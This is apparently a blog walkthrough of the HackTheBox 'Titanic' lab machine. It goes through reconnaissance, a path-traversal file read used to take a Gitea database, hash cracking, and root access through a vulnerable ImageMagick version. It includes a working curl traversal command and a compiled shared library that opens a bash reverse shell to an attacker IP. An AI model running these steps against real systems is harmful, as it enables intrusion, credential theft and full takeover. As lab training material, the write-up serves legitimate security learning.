---
title: Titanic
published: 2025-02-22
description: '
Titanic is an easy Linux machine that demonstrates a basic Arbitrary File Read vulnerability, Gitea hash cracking, and exploitation of a vulnerable version of ImageMagick.
'
image: /banner/Titanic.png
tags: [Linux, Easy, Arbitrary File Read, Gitea, ImageMagick]
category: 'HackTheBox'
draft: false
lang: 'en'
---

# Description

Titanic is an easy Linux machine that demonstrates a basic Arbitrary File Read vulnerability, Gitea hash cracking, and exploitation of a vulnerable version of Imagick.

# Recon

## nmap

Result of `nmap` scan :

```bash
# Nmap 7.95 scan initiated Sat Feb 22 20:10:13 2025 as: nmap -vv -p- -T4 -sSCV -oN all_tcp_scan.txt 10.10.11.55
Nmap scan report for 10.10.11.55
Host is up, received echo-reply ttl 63 (0.096s latency).
Scanned at 2025-02-22 20:10:19 WIB for 9s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are only two open ports, `22` and `80`. The output reveals a `titanic.htb` domain. Add the domain to the `/etc/hosts` file

```bash
10.10.11.55 titanic.htb
```

# 80 - TCP

## Enumeration

Visiting the website will only display a static page.

<p align="center">
  <img src="/machines/titanic/web.png" alt="main website" />
</p>

Let's fuzz the VHOST.

```bash
❯ ffuf -u http://titanic.htb/ -H "Host: FUZZ.titanic.htb" -w ~/pentesttools/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -ic -c -fw 20

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb/
 :: Wordlist         : FUZZ: /home/jergal/pentesttools/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 20
________________________________________________

dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 83ms]
```

It founds `dev` subdomain, add it to the `/etc/hosts` file

## dev

### Enumeration

Visiting `dev.titanic.htb` reveals a Gitea service hosting two public repositories owned by the `developer` user.

<p align="center">
  <img src="/machines/titanic/repos.png" alt="Gitea repository" />
</p>

The `docker-config` repository contains two `docker-compose.yml` files for the `gitea` and `mysql` services.<br>
`gitea/docker-compose.yml`

```yml
version: "3"

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22" # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```

It reveals `/home/developer/gitea/data` path that might be useful later.<br>
`mysql/docker-compose.yml`

```yml
version: "3.8"

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: "MySQLP@$$w0rd!"
      MYSQL_DATABASE: tickets
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```

It contains a hardcoded password, but since the service is running on localhost, it isn't useful.<br>
The `flask-app` likely contains the source code for the `titanic.htb` since `templates/index.html` matches the website's static page. After analyzing `app.py` for some time, I discovered an Arbitrary File Read vulnerability in the `/download` endpoint.

### AFR

```py
@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404
```

Because the `ticket` paramater isn't sanitized or filtered, we can perform directory traversal to read arbitrary files from the filesystem. The Gitea data path is leaked, so we can get the database file from `/home/developer/gitea/data/gitea/gitea.db`, which is originally stored at `/data/gitea/gitea.db` in the container.

```bash
curl 'http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db' -o gitea.db
```

### Gitea Hash

To crack gitea hashes, we first need to format them properly. This [great article](https://www.unix-ninja.com/p/cracking_giteas_pbkdf2_password_hashes) explains the process and provides a [script](https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py) to automate the formatting for use with Hashcat. I will only try to crack `developer` user hash.

```bash
sqlite3 gitea.db "select passwd, salt from user where name = 'developer';" | gitea2hashcat.py
```

Crack it using `hashcat` with the `rockyou.txt` wordlist.

```bash
hashcat -m 10900 '<formatted_hash>' <path_to_rockyou>
```

# Shell as developer

## User Flag

The cracked password should work for accessing SSH as `developer`.

```bash
developer@titanic:~$ cat user.txt
deadbeefd76fdd555e5bb9444fa7fake
```

## Enumeration

The `/opt` directory contains three directory.

```bash
developer@titanic:~$ ls -l /opt
total 12
drwxr-xr-x 5 root developer 4096 Feb  7 10:37 app
drwx--x--x 4 root root      4096 Feb  7 10:37 containerd
drwxr-xr-x 2 root root      4096 Feb  7 10:37 scripts
```

The `scripts` directory is interesting because it contains a script file owned by `root`.

```bash
developer@titanic:~$ ls -l /opt/scripts/
total 4
-rwxr-xr-x 1 root root 167 Feb  3 17:11 identify_images.sh
```

```bash
developer@titanic:~$ cat /opt/scripts/identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

This script scans for `.jpg` files inside `/opt/app/static/assets/images/`, a directory where we have write access, and then executes `/usr/bin/magick identify` on each `.jpg` file.

```bash
developer@titanic:/tmp$ magick --version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```

The current version of `ImageMagick` is `7.1.1-35` which has security flaw [Arbitrary Code Execution in `AppImage` version `ImageMagick`](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8).

# Shell as root

Follow the Proof of Concept (PoC) from the GitHub Security to exploit the vulnerability.

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("bash -c 'bash -i >& /dev/tcp/10.10.xx.xx/9001 0>&1'");
    exit(0);
}
EOF
cp libxcb.so.1 /opt/app/static/assets/images/
cp /opt/app/static/assets/images/home.jpg /opt/app/static/assets/images/bruh.jpg
```

And wait for the script to be executed.

## Root flag

```bash
root@titanic:/opt/app/static/assets/images# cat /root/root.txt
cat /root/root.txt
deadbeefe33524f64e49c4ac4ad7fake
```
